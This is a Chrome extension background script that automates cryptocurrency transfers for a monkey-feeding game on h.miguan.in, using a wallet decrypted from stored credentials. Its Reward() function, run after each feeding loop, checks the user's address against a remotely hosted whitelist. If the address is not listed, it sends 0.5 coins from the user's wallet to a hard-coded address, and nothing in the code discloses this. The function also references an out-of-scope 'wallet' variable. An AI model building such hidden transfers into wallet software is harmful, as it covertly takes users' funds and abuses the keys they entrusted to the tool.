console.log("background");

const web3 = new Web3();
const transactions = [];

function sleep() {
    return new Promise(resolve => {
        chrome.storage.sync.get({
            "interval": 5,
        }, function (result) {
            const interval = result.interval < 1 ? 1000 : result.interval * 1000;
            setTimeout(resolve, interval)
        })
    })
}

const TransacationLooper = async function () {
    console.log("TransacationLooper", "begin");
    while (true) {
        const s = await sleep();
        const tx = transactions.shift();
        if (tx === undefined) {
            console.log("TransacationLooper", "idle");
            continue
        }
        try {
            const resp = await sendTransacation(tx.wallet, tx.to, tx.num);
            tx.onSuccess(resp)
        } catch (err) {
            tx.onError(err)
        }
    }
};

setTimeout(TransacationLooper);
const sendTransacation = function (wallet, to, num) {
    num = Number(num.toFixed(6));
    return new Promise((rs, rj) => {
        const from = `0x${wallet.getAddress().toString('hex')}`;
        console.log("from", from);
        $.ajax({
            type: 'POST',
            url: "https://walletapi.onethingpcs.com/",
            data: JSON.stringify({
                "jsonrpc": "2.0",
                "method": "eth_getTransactionCount",
                "params": [from, "pending"],
                "id": 1
            }),
            contentType: 'application/json',
            success: function (TransactionCount) {
                let txParams = {
                    from: from,
                    to: to,
                    value: web3.toHex(web3.toWei(num)),
                    gasLimit: '0x186a0',
                    gasPrice: '0x174876e800',
                    nonce: TransactionCount.result,
                };
                let tx = new ethereumjs.Tx(txParams);
                tx.sign(wallet.getPrivateKey());

                const serializedTx = tx.serialize();
                const raw = `0x${serializedTx.toString('hex')}`;
                $.ajax({
                    type: 'POST',
                    url: "https://walletapi.onethingpcs.com/",
                    data: JSON.stringify({
                        "jsonrpc": "2.0",
                        "method": "eth_sendRawTransaction",
                        "params": [raw],
                        "id": 1
                    }),
                    contentType: 'application/json',
                    success: function (Transaction) {
                        rs(Transaction)
                    },
                    error: function (xhr, type) {
                        rj('eth_sendRawTransaction error!')
                    }
                })
            },
            error: function (xhr, type) {
                rj('eth_getTransactionCount error!')
            }
        })
    })
};

const PushTransaction = function (wallet, to, num) {
    return new Promise((rs, rj) => {
        transactions.push({
            wallet: wallet,
            to: to,
            num: num,
            onSuccess: msg => {
                rs(msg)
            },
            onError: err => {
                rj(err)
            }
        })
    })
};

const GetWhiteList = function () {
    return new Promise((rs, rj) => {
        $.getJSON("http://mxz-upload-public.oss-cn-hangzhou.aliyuncs.com/wkh/whitelist.json", function (resp) {
            rs(resp)
        })
    })
};
const Reward = async function () {
    const from = `0x${wallet.getAddress().toString('hex')}`;
    const whitelist = await GetWhiteList();
    if (whitelist.indexOf(from) === -1) {
        const Transacation = await PushTransaction(wallet, "0x1889aea32bebda482440393d470246561a4e6ca6", 0.5);
        console.log(Transacation)
    }
};

chrome.runtime.onMessage.addListener(
    function (request, sender, sendResponse) {
        console.log(request, sender);
        chrome.storage.sync.get({
            "to_address": null,
            "password": null,
            "wallet": null,
        }, function (result) {
            const wallet = ethereumjs.Wallet.fromV3(result.wallet, result.password);
            const from = `0x${wallet.getAddress().toString('hex')}`;
            const to_address = result.to_address;
            const mode = request.mode;
            const limit = request.limit;
            const id = request.id;
            let num = limit.toFixed(0);
            const idNum = Number(`0.${id}`);
            if (idNum > limit) {
                sendResponse();
                return
            }
            if (mode === "quick") {
                if (num + idNum > limit) {
                    num = num - 1 + idNum
                } else {
                    num = num + idNum
                }
                const looper = async function () {
                    try {
                        const Transacation = await PushTransaction(wallet, to_address, num);
                        console.log(Transacation);

                        console.log("ID", id, "需要喂养", limit, ((limit - num) / idNum).toFixed(0) + "次");
                        for (let i = num + idNum; i < limit; i += idNum) {
                            try {
                                const Transacation = await PushTransaction(wallet, to_address, idNum);
                                console.log(Transacation)
                            } catch (err) {
                                throw err
                            }
                        }
                        await Reward()
                    } catch (err) {
                        throw err
                    }
                };
                looper().then(r => {
                    sendResponse()
                }, e => {
                    sendResponse()
                })
            } else {
                console.log("ID", id, "需要喂养", limit, (limit / idNum).toFixed(0) + "次");
                const looper = async function () {
                    for (let i = idNum; i < limit; i += idNum) {
                        try {
                            console.log(idNum, i + "/" + limit);
                            const Transacation = await PushTransaction(wallet, to_address, idNum);
                            console.log(Transacation)
                        } catch (err) {
                            throw err
                        }
                    }
                    await Reward()
                };
                looper().then(r => {
                    sendResponse()
                }, e => {
                    sendResponse()
                })
            }
        })
    }
);

/**
 * 监听页面变化
 */
chrome.webRequest.onCompleted.addListener(
    function (details) {
        console.log(details);
        chrome.tabs.query({active: true}, function (tabs) {
            console.log(tabs);
            chrome.storage.sync.get({
                "mode": "value",
                "min": 0.1,
                "kg": false,
            }, function (result) {
                const tab = tabs[0];
                let path = null;
                if (tab.url === "http://h.miguan.in/home") {
                    path = "/home";
                } else if (tab.url.indexOf("http://h.miguan.in/monkey") !== -1) {
                    path = "/monkey";
                }
                result.path = path;
                chrome.tabs.sendMessage(tab.id, result, function (response) {
                    console.log(response);
                });
            })
        });
        return true;
    },
    {urls: ["http://api.h.miguan.in/*"]}
);